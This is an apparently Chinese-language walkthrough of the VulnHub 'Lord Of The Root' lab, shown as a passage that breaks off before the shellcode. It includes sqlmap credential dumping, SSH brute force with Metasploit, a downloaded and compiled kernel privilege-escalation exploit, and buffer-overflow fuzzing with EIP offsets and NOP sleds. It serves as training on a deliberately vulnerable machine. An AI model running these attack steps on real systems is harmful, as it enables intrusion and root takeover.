<p>如所见，与我们之前的扫描相比，还有一个开放的端口，即1337，它有HTTP服务，这就是想要的，因为默认情况下80端口没有打开。让我们通过此端口打开目标IP。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.113:1337/</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub183.jpg"></p>
<p>如上所示，打开的页面仅包含一张图片，然后还检查了其源代码，但没有任何线索。通常，总是有一些将robots.txt文件放入网络目录的机会，因此，在渗透任何系统时，都应始终检查robots.txt文件。在这里，已经在地址192.168.56.113:1337/robots.txt中对robots.txt进行了测试，将打开一个新的网页，显示以下图片。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub184.jpg"></p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>之后，我们查看了其源代码并找到了base64的编码值。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;/images/hipster.jpg&quot;</span> align=<span class="string">&quot;middle&quot;</span>&gt;</span><br><span class="line">&lt;!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>解码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># echo &quot;THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&quot; | base64 -d</span></span><br><span class="line">Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!root@kali:~<span class="comment"># echo &quot;Lzk3ODM0NTIxMC9pbmRleC5waHA=&quot; | base64 -d</span></span><br><span class="line">/978345210/index.php</span><br></pre></td></tr></table></figure>

<p>访问以下的url</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.113:1337/978345210/index.php</span><br></pre></td></tr></table></figure>

<p>现在，有一个登录口。尝试SQL注入的帮助下登录，使用sqlmap。<br>由于不知道确切的用户名和密码，因此，使用SQLMAP进行基于登录表单的注入，通过执行以下命令来检索数据库名称和登录凭据。</p>
<p>时间盲注，好慢。。。最后，显示用户名和密码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -u &quot;http://192.168.56.113:1337/978345210/index.php&quot; --forms -D Webapp -T Users --dump --batch</span></span><br><span class="line">Database: Webapp</span><br><span class="line">Table: Users</span><br><span class="line">[5 entries]</span><br><span class="line">+----+------------------+----------+</span><br><span class="line">| id | password         | username |</span><br><span class="line">+----+------------------+----------+</span><br><span class="line">| 1  | iwilltakethering | frodo    |</span><br><span class="line">| 2  | MyPreciousR00t   | smeagol  |</span><br><span class="line">| 3  | AndMySword       | aragorn  |</span><br><span class="line">| 4  | AndMyBow         | legolas  |</span><br><span class="line">| 5  | AndMyAxe         | gimli    |</span><br><span class="line">+----+------------------+----------+</span><br></pre></td></tr></table></figure>

<p>将所有这些用户名和密码保存在两个不同的文本文件中。并借助方法在SSH登录暴力破解使用此文本文件。执行攻击，请转到Kali的终端并通过键入msfdb run并进一步键入来打开Metasploit：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/lordoftheroot<span class="comment"># msfdb run</span></span><br><span class="line">[+] Starting database</span><br><span class="line">                                                  </span><br><span class="line"></span><br><span class="line">      .:okOOOkdc<span class="string">&#x27;           &#x27;</span>cdkOOOko:.                                                                                    </span><br><span class="line">    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.                                                                                  </span><br><span class="line">   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:                                                                                 </span><br><span class="line">  <span class="string">&#x27;OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO&#x27;</span>                                                                                </span><br><span class="line">  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo                                                                                </span><br><span class="line">  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx                                                                                </span><br><span class="line">  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl                                                                                </span><br><span class="line">  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.                                                                                </span><br><span class="line">   cOOOOOOO.MMM.OOc.MMMMM<span class="string">&#x27;oOO.MMM,OOOOOOOc                                                                                 </span></span><br><span class="line"><span class="string">    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo                                                                                  </span></span><br><span class="line"><span class="string">     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl                                                                                   </span></span><br><span class="line"><span class="string">      ;OOOO&#x27;</span>MMM.OOOO.MMM:OOOO.MMM;OOOO;                                                                                    </span><br><span class="line">       .dOOo<span class="string">&#x27;WM.OOOOocccxOOOO.MX&#x27;</span>xOOd.                                                                                     </span><br><span class="line">         ,kOl<span class="string">&#x27;M.OOOOOOOOOOOOO.M&#x27;</span>dOk,                                                                                       </span><br><span class="line">           :kk;.OOOOOOOOOOOOO.;Ok:                                                                                         </span><br><span class="line">             ;kOOOOOOOOOOOOOOOk:                                                                                           </span><br><span class="line">               ,xOOOOOOOOOOOx,                                                                                             </span><br><span class="line">                 .lOOOOOOOl.                                                                                               </span><br><span class="line">                    ,dOd,                                                                                                  </span><br><span class="line">                      .                                                                                                    </span><br><span class="line"></span><br><span class="line">       =[ metasploit v5.0.69-dev                          ]</span><br><span class="line">+ -- --=[ 1959 exploits - 1094 auxiliary - 336 post       ]</span><br><span class="line">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">msf5 &gt; use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">msf5 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> rhosts 192.168.56.113</span><br><span class="line">rhosts =&gt; 192.168.56.113</span><br><span class="line">msf5 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> user_file /root/vulnhub/lordoftheroot/user.txt</span><br><span class="line">user_file =&gt; /root/vulnhub/lordoftheroot/user.txt</span><br><span class="line">msf5 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> pass_file /root/vulnhub/lordoftheroot/pass.txt</span><br><span class="line">pass_file =&gt; /root/vulnhub/lordoftheroot/pass.txt</span><br><span class="line">msf5 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> stop_on_success <span class="literal">true</span></span><br><span class="line">stop_on_success =&gt; <span class="literal">true</span></span><br><span class="line">msf5 auxiliary(scanner/ssh/ssh_login) &gt; exploit</span><br><span class="line"></span><br><span class="line">[+] 192.168.56.113:22 - Success: <span class="string">&#x27;smeagol:MyPreciousR00t&#x27;</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">[*] Command shell session 1 opened (192.168.56.102:43037 -&gt; 192.168.56.113:22) at 2020-01-25 12:36:48 -0500</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>

<p>得到正确的用户名和密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol/MyPreciousR00t</span><br></pre></td></tr></table></figure>

<p>此外，Metasploit通过提供远程系统命令shell（未经授权访问受害者系统）提供了额外的好处。现在开始渗透访问root权限。然后，要访问适当的TTY Shell，键入以下python一行脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(scanner/ssh/ssh_login) &gt; sessions 1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line">Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.19.0-25-generic i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com/</span><br><span class="line"></span><br><span class="line">                            .____    _____________________________                              </span><br><span class="line">                            |    |   \_____  \__    ___/\______   \                             </span><br><span class="line">                            |    |    /   |   \|    |    |       _/                             </span><br><span class="line">                            |    |___/    |    \    |    |    |   \                             </span><br><span class="line">                            |_______ \_______  /____|    |____|_  /                             </span><br><span class="line">                                    \/       \/                 \/                              </span><br><span class="line"> __      __       .__                                ___________      .__                   .___</span><br><span class="line">/  \    /  \ ____ |  |   ____  ____   _____   ____   \_   _____/______|__| ____   ____    __| _/</span><br><span class="line">\   \/\/   // __ \|  | _/ ___\/  _ \ /     \_/ __ \   |    __) \_  __ \  |/ __ \ /    \  / __ | </span><br><span class="line"> \        /\  ___/|  |_\  \__(  &lt;_&gt; )  Y Y  \  ___/   |     \   |  | \/  \  ___/|   |  \/ /_/ | </span><br><span class="line">  \__/\  /  \___  &gt;____/\___  &gt;____/|__|_|  /\___  &gt;  \___  /   |__|  |__|\___  &gt;___|  /\____ | </span><br><span class="line">       \/       \/          \/            \/     \/       \/                  \/     \/      \/ </span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">smeagol@LordOfTheRoot:~$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(smeagol) gid=1000(smeagol) groups=1000(smeagol)</span><br><span class="line">smeagol@LordOfTheRoot:~$ whoami</span><br><span class="line">whoami</span><br><span class="line">smeagol</span><br><span class="line">smeagol@LordOfTheRoot:~$</span><br></pre></td></tr></table></figure>

<h3 id="提权1-搜索exploit来提权"><a href="#提权1-搜索exploit来提权" class="headerlink" title="提权1:搜索exploit来提权"></a>提权1:搜索exploit来提权</h3><p>到达终端。在这里，键入以下命令以了解内核的版本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:~$ lsb_release -a</span><br><span class="line">lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 14.04.3 LTS</span><br><span class="line">Release:        14.04</span><br><span class="line">Codename:       trusty</span><br></pre></td></tr></table></figure>

<p>版本是14.04，幸运的是，对此版本有一个exploit。在Kali终端中，搜索以下类型的漏洞：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># searchsploit ubuntu 14.04</span></span><br><span class="line">---------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                    |  Path</span><br><span class="line">                                                                                  | (/usr/share/exploitdb/)</span><br><span class="line">---------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Apport (Ubuntu 14.04/14.10/15.04) - Race Condition Privilege Escalation           | exploits/linux/<span class="built_in">local</span>/37088.c</span><br><span class="line">Apport 2.14.1 (Ubuntu 14.04.2) - Local Privilege Escalation                       | exploits/linux/<span class="built_in">local</span>/36782.sh</span><br><span class="line">Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 /  | exploits/linux_x86-64/<span class="built_in">local</span>/42275.c</span><br><span class="line">Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - <span class="string">&#x27;ld | exploits/linux_x86/local/42276.c</span></span><br><span class="line"><span class="string">Linux Kernel (Ubuntu 14.04.3) - &#x27;</span>perf_event_open()<span class="string">&#x27; Can Race with execve() (Acces | exploits/linux/local/39771.txt</span></span><br><span class="line"><span class="string">Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#x27;</span>overlayfs<span class="string">&#x27; Local P | exploits/linux/local/37292.c</span></span><br><span class="line"><span class="string">Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#x27;</span>overlayfs<span class="string">&#x27; Local P | exploits/linux/local/37293.txt</span></span><br><span class="line"><span class="string">Linux Kernel 3.x (Ubuntu 14.04 / Mint 17.3 / Fedora 22) - Double-free usb-midi SM | exploits/linux/local/41999.txt</span></span><br><span class="line"><span class="string">Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - &#x27;</span>overlayfs<span class="string">&#x27; Local Privilege Escalation  | exploits/linux/local/39166.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - &#x27;</span>AF_PACKET<span class="string">&#x27; Race Condition Privi | exploits/linux_x86-64/local/40871.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.0-21 &lt; 4.4.0-51 (Ubuntu 14.04/16.04 x86-64) - &#x27;</span>AF_PACKET<span class="string">&#x27; Race C | exploits/linux/local/47170.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escal | exploits/linux/local/43418.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - L | exploits/linux/local/47169.c</span></span><br><span class="line"><span class="string">NetKit FTP Client (Ubuntu 14.04) - Crash/Denial of Service (PoC)                  | exploits/linux/dos/37777.txt</span></span><br><span class="line"><span class="string">Ubuntu 14.04/15.10 - User Namespace Overlayfs Xattr SetGID Privilege Escalation   | exploits/linux/local/41762.txt</span></span><br><span class="line"><span class="string">WebKitGTK 2.1.2 (Ubuntu 14.04) - Heap based Buffer Overflow                       | exploits/linux/local/44204.md</span></span><br><span class="line"><span class="string">usb-creator 0.2.x (Ubuntu 12.04/14.04/14.10) - Local Privilege Escalation         | exploits/linux/local/36820.txt</span></span><br><span class="line"><span class="string">---------------------------------------------------------------------------------- ----------------------------------------</span></span><br><span class="line"><span class="string">Shellcodes: No Result</span></span><br></pre></td></tr></table></figure>

<p>选下面这个exploit，当然，自己也可以去尝试其他的exploit，我这里为了节约时间就不演示了。。。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - <span class="string">&#x27;overlayfs&#x27;</span> Local Privilege Escalation  | exploits/linux/<span class="built_in">local</span>/39166.c</span><br></pre></td></tr></table></figure>

<p>借助cp命令将漏洞exploit复制到当前目录，然后运行HTTP python服务器将其转移到目标计算机中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/lordoftheroot<span class="comment"># cp /usr/share/exploitdb/exploits/linux/local/39166.c .</span></span><br><span class="line">root@kali:~/vulnhub/lordoftheroot<span class="comment"># ls</span></span><br><span class="line">39166.c  pass.txt  user.txt</span><br><span class="line">root@kali:~/vulnhub/lordoftheroot<span class="comment"># python -m SimpleHTTPServer </span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure>

<p>在shell中编译exp，然后赋予权限，运行生成的exp进行提权，可以看到提权成功，非常的简单</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:~$ wget http://192.168.56.102:8000/39166.c</span><br><span class="line">wget http://192.168.56.102:8000/39166.c</span><br><span class="line">--2020-01-25 18:52:13--  http://192.168.56.102:8000/39166.c</span><br><span class="line">Connecting to 192.168.56.102:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 2789 (2.7K) [text/plain]</span><br><span class="line">Saving to: ‘39166.c’</span><br><span class="line"></span><br><span class="line">100%[======================================&gt;] 2,789       --.-K/s   <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-01-25 18:52:13 (575 MB/s) - ‘39166.c’ saved [2789/2789]</span><br><span class="line"></span><br><span class="line">smeagol@LordOfTheRoot:~$ gcc 39166.c -o exp</span><br><span class="line">gcc 39166.c -o exp</span><br><span class="line">smeagol@LordOfTheRoot:~$ chmod 777 exp</span><br><span class="line">chmod 777 exp</span><br><span class="line">smeagol@LordOfTheRoot:~$ ./exp</span><br><span class="line">./exp</span><br><span class="line">root@LordOfTheRoot:~<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=1000(smeagol) groups=0(root),1000(smeagol)</span><br><span class="line">root@LordOfTheRoot:~<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>最后找到flag，挑战结束</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@LordOfTheRoot:/root<span class="comment"># cat Flag.txt</span></span><br><span class="line">cat Flag.txt</span><br><span class="line">“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”</span><br><span class="line">– Gandalf</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub185.jpg"></p>
<h3 id="提权2-利用SUID利用root拥有的二进制文件来获得root"><a href="#提权2-利用SUID利用root拥有的二进制文件来获得root" class="headerlink" title="提权2:利用SUID利用root拥有的二进制文件来获得root"></a>提权2:利用SUID利用root拥有的二进制文件来获得root</h3><p>导航到root目录，看到一个名为“SECRET”的目录。在此目录中，有3个“doors”，每个都有一个名为“file”的文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:/$ <span class="built_in">cd</span> SECRET</span><br><span class="line"><span class="built_in">cd</span> SECRET</span><br><span class="line">smeagol@LordOfTheRoot:/SECRET$ ls</span><br><span class="line">ls</span><br><span class="line">door1  door2  door3</span><br><span class="line">smeagol@LordOfTheRoot:/SECRET$ ls -lahR</span><br><span class="line">ls -lahR</span><br><span class="line">.:</span><br><span class="line">total 20K</span><br><span class="line">drwxr-xr-x  5 root root 4.0K Sep 22  2015 .</span><br><span class="line">drwxr-xr-x 23 root root 4.0K Sep 22  2015 ..</span><br><span class="line">drwxr-xr-x  2 root root 4.0K Jan 25 19:15 door1</span><br><span class="line">drwxr-xr-x  2 root root 4.0K Jan 25 19:15 door2</span><br><span class="line">drwxr-xr-x  2 root root 4.0K Jan 25 19:15 door3</span><br><span class="line"></span><br><span class="line">./door1:</span><br><span class="line">total 16K</span><br><span class="line">drwxr-xr-x 2 root root 4.0K Jan 25 19:15 .</span><br><span class="line">drwxr-xr-x 5 root root 4.0K Sep 22  2015 ..</span><br><span class="line">-rwsr-xr-x 1 root root 7.2K Sep 17  2015 file</span><br><span class="line"></span><br><span class="line">./door2:</span><br><span class="line">total 16K</span><br><span class="line">drwxr-xr-x 2 root root 4.0K Jan 25 19:15 .</span><br><span class="line">drwxr-xr-x 5 root root 4.0K Sep 22  2015 ..</span><br><span class="line">-rwsr-xr-x 1 root root 7.2K Sep 17  2015 file</span><br><span class="line"></span><br><span class="line">./door3:</span><br><span class="line">total 16K</span><br><span class="line">drwxr-xr-x 2 root root 4.0K Jan 25 19:15 .</span><br><span class="line">drwxr-xr-x 5 root root 4.0K Sep 22  2015 ..</span><br><span class="line">-rwsr-xr-x 1 root root 5.1K Sep 22  2015 file</span><br></pre></td></tr></table></figure>

<p>看到这些文件具有SUID并由Root拥有！如果可以利用这一点，那可能就是升级root的门票。检查每个文件，看到它们都是二进制可执行文件。但是,3个中的1个具有不同的sha1哈希：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:/SECRET$ file door1/file door2/file door3/file</span><br><span class="line">file door1/file door2/file door3/file</span><br><span class="line">door1/file: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=364b5cbb85546e36256039ce4599eee471bfbf86, not stripped</span><br><span class="line">door2/file: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=9e50c7cacaf5cc2c78214c81f110c88e61ad0c10, not stripped</span><br><span class="line">door3/file: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=364b5cbb85546e36256039ce4599eee471bfbf86, not stripped</span><br></pre></td></tr></table></figure>

<p>根据以前的经验，最好使用与其他2不同的二进制文件。此外，注意到在设置了一定时间后，二进制文件被切换到了新的door。为了解决这个问题，将文件复制到smeagol的桌面上以进行更一致的测试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:/SECRET$ cp door2/file /home/smeagol/Desktop/</span><br><span class="line">cp door2/file /home/smeagol/Desktop/</span><br><span class="line">smeagol@LordOfTheRoot:/SECRET$ ls /home/smeagol/Desktop/</span><br><span class="line">ls /home/smeagol/Desktop/</span><br><span class="line">file</span><br></pre></td></tr></table></figure>

<p>运行此文件，看到它要求用户输入字符串：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:~/Desktop$ ./file</span><br><span class="line">./file</span><br><span class="line">Syntax: ./file &lt;input string&gt;</span><br><span class="line">smeagol@LordOfTheRoot:~/Desktop$ ./file A</span><br><span class="line">./file A</span><br></pre></td></tr></table></figure>

<p>看到这是vulnhub上的映像，可以假定该文件容易受到缓冲区溢出的影响。使用python来模糊文件并确认：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:~/Desktop$ ./file $(python -c <span class="string">&#x27;print &quot;A&quot; * 100&#x27;</span>)</span><br><span class="line">./file $(python -c <span class="string">&#x27;print &quot;A&quot; * 100&#x27;</span>)</span><br><span class="line">smeagol@LordOfTheRoot:~/Desktop$ ./file $(python -c <span class="string">&#x27;print &quot;A&quot; * 200&#x27;</span>)</span><br><span class="line">./file $(python -c <span class="string">&#x27;print &quot;A&quot; * 200&#x27;</span>)</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">smeagol@LordOfTheRoot:~/Desktop$ ./file $(python -c <span class="string">&#x27;print &quot;A&quot; * 150&#x27;</span>)</span><br><span class="line">./file $(python -c <span class="string">&#x27;print &quot;A&quot; * 150&#x27;</span>)</span><br><span class="line">smeagol@LordOfTheRoot:~/Desktop$ ./file $(python -c <span class="string">&#x27;print &quot;A&quot; * 175&#x27;</span>)</span><br><span class="line">./file $(python -c <span class="string">&#x27;print &quot;A&quot; * 175&#x27;</span>)</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">smeagol@LordOfTheRoot:~/Desktop$ ./file $(python -c <span class="string">&#x27;print &quot;A&quot; * 160&#x27;</span>)</span><br><span class="line">./file $(python -c <span class="string">&#x27;print &quot;A&quot; * 160&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>注意到当文件接收大约175个字符时存在分段错误。<br>为了获得更准确的计数，使用metasploit中的内置ruby脚本来创建175个字符的模式字符串：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 175</span></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7A</span><br></pre></td></tr></table></figure>

<p>采用以下字符串并通过GDB运行它，然后运行字符串：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:~/Desktop$ gdb -q ./file</span><br><span class="line">gdb -q ./file</span><br><span class="line">Reading symbols from ./file...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7A</span><br><span class="line">&lt;8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7A                </span><br><span class="line">Starting program: /home/smeagol/Desktop/file Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7A</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x41376641 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure>

<p>如预期的那样，在0x41376641收到段错误。可以将此数字带回metasploit脚本，以查看它是多少个字符：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41376641</span></span><br><span class="line">[*] Exact match at offset 171</span><br></pre></td></tr></table></figure>

<p>现在知道二进制文件将在第171个字符串处进行段错误处理，然后可以更新fuzz进行确认。通过GDB，添加171个字符A，4个字符B和其余的C。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:~/Desktop$ gdb -q ./file</span><br><span class="line">gdb -q ./file</span><br><span class="line">Reading symbols from ./file...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">(gdb) run $(python -c <span class="string">&#x27;print &quot;A&quot; * 171 + &quot;B&quot; * 4 + &quot;C&quot; * 50&#x27;</span>)</span><br><span class="line">run $(python -c <span class="string">&#x27;print &quot;A&quot; * 171 + &quot;B&quot; * 4 + &quot;C&quot; * 50&#x27;</span>)</span><br><span class="line">Starting program: /home/smeagol/Desktop/file $(python -c <span class="string">&#x27;print &quot;A&quot; * 171 + &quot;B&quot; * 4 + &quot;C&quot; * 50&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x42424242 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb) info r</span><br><span class="line">info r</span><br><span class="line">eax            0x0      0</span><br><span class="line">ecx            0xbffffdd0       -1073742384</span><br><span class="line">edx            0xbffffb54       -1073743020</span><br><span class="line">ebx            0xb7fc0000       -1208221696</span><br><span class="line">esp            0xbffffb30       0xbffffb30</span><br><span class="line">ebp            0x41414141       0x41414141</span><br><span class="line">esi            0x0      0</span><br><span class="line">edi            0x0      0</span><br><span class="line">eip            0x42424242       0x42424242</span><br><span class="line">eflags         0x10202  [ IF RF ]</span><br><span class="line">cs             0x73     115</span><br><span class="line">ss             0x7b     123</span><br><span class="line">ds             0x7b     123</span><br><span class="line">es             0x7b     123</span><br><span class="line">fs             0x0      0</span><br><span class="line">gs             0x33     51</span><br></pre></td></tr></table></figure>

<p>如上所示，检查了寄存器，发现EIP现在已被0x42424242覆盖，该十六进制转换为BBBB。现在可以控制EIP！进一步的枚举告诉我还启用了ASLR：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:~/Desktop$ cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<p>看到启用了ASLR，这将使的地址空间随机化。此外，程序中没有可使用的JMP ESP指令。使无法指定特定的EIP地址来指向shellcode。</p>
<p>但是，我的想法是，如果可以循环利用漏洞，也许可以“猜测”甚至更好，用EIP地址获得“lucky”，从而击中了shellcode。为此，需要在漏洞利用程序中添加一个较大的NOPsled，以便如果EIP确实被正确击中，则NOPsled将允许程序滑至我的shellcode。</p>
<p>再次运行payload，这次使用了2000个较大的Nopsled：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:~/Desktop$ gdb -q ./file</span><br><span class="line">gdb -q ./file</span><br><span class="line">Reading symbols from ./file...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">(gdb) run $(python -c <span class="string">&#x27;print &quot;A&quot; * 171 + &quot;B&quot; * 4 + &quot;\x90&quot; * 2000&#x27;</span>)</span><br><span class="line">run $(python -c <span class="string">&#x27;print &quot;A&quot; * 171 + &quot;B&quot; * 4 + &quot;\x90&quot; * 2000&#x27;</span>)</span><br><span class="line">Starting program: /home/smeagol/Desktop/file $(python -c <span class="string">&#x27;print &quot;A&quot; * 171 + &quot;B&quot; * 4 + &quot;\x90&quot; * 2000&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x42424242 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb) x/s <span class="variable">$esp</span></span><br><span class="line">x/s <span class="variable">$esp</span></span><br><span class="line">0xbfffee70:     <span class="string">&#x27;\220&#x27;</span> &lt;repeats 200 <span class="built_in">times</span>&gt;...</span><br></pre></td></tr></table></figure>

<p>因此，仍然可以控制EIP，看来ESP指向的是其他位置，0xbfffee70,将使用它作为EIP的位置。另外，将包括shellcode。生成shell的非常常见的shellcode是：</p>
